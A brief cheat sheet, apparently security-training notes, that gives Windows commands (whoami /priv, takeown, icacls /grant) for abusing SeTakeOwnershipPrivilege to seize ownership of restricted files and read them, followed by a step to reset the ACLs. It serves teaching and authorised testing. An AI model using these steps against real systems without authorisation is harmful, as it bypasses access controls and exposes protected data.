# Exploiting SeTakeOwnershipPrivilege

## Overview

`SeTakeOwnershipPrivilege` allows a user to take ownership of files and folders, then modify ACLs to gain access to otherwise restricted data.

---

## 1. Verify Privileges

```powershell
whoami /priv
```

---

## 2. Enable Privilege (If Needed)

```powershell
.\EnableAllTokenPrivs.ps1
```

---

## 3. Identify Target Files/Folders

```powershell
Get-ChildItem -Path <directory> -Recurse
cmd /c dir /q
```

---

## 4. Take Ownership

```cmd
takeown /f <target>
```

Or PowerShell:

```powershell
Set-Acl -Path <target> -AclObject (Get-Acl <target>)
```

---

## 5. Modify ACLs

```cmd
icacls <target> /grant <user>:F
```

---

## 6. Access Data

```powershell
cat <target>
```

or

```cmd
type <target>
```

---

## 7. Revert Changes

```cmd
icacls <target> /reset
```
